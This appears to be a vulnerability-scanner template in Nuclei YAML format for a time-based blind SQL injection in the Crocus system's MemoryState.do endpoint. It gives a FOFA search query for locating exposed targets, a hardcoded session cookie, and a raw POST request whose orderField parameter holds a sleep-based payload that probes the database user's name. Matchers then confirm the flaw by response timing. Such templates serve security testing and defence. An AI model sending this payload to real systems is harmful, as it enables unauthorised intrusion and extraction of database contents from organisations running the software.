id: poc-yaml-crocus-memorystate-do-sqli
info:
  name: "锐明技术 Crocus系统 MemoryState.do SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: crocus
    fofa: "body=\"/ThirdResource/respond/respond.min.js\" && title=\"Crocus\""

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST /MemoryState.do?Action=Query HTTP/1.1
        Host: {{Hostname}}
        Cookie: Saffron.U=VUlEPTEmVU49MQ==
        Content-Type: application/x-www-form-urlencoded

        EndTime=&PageIndex=0&PageSize=20&RepairState=-1&StartTime=&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep({{t1}}),1))a)&orderType=asc
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"Result\":"
          - "\"groupName\":"
      - type: word
        part: header
        words:
          - "text/json"
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
